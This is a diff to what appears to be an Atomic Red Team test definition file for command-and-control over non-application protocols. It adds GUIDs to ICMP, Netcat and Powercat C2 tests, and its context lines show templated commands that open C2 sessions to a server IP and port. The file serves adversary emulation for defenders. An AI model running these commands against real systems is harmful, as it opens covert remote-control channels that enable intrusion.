@@ -4,6 +4,7 @@ display_name: Standard Non-Application Layer Protocol
 
 atomic_tests:
 - name: ICMP C2
+  auto_generated_guid: b425e76f-3377-4dc8-ac27-980badf46d98
   description: |
     This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
     refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
@@ -22,6 +23,7 @@ atomic_tests:
       Invoke-PowerShellIcmp -IPAddress #{server_ip}
 
 - name: Netcat C2
+  auto_generated_guid: c155dd74-a7c6-41a1-a975-ee9efd1a883f
   description: |
     Start C2 Session Using Ncat
     To start the listener on a Linux device, type the following: 
@@ -70,6 +72,7 @@ atomic_tests:
       cmd /c #{ncat_exe} #{server_ip} #{server_port}
 
 - name: Powercat C2
+  auto_generated_guid: 904f8b3f-9262-43ac-b6da-43905ab30156
   description: |
     Start C2 Session Using Powercat
     To start the listener on a Linux device, type the following: 
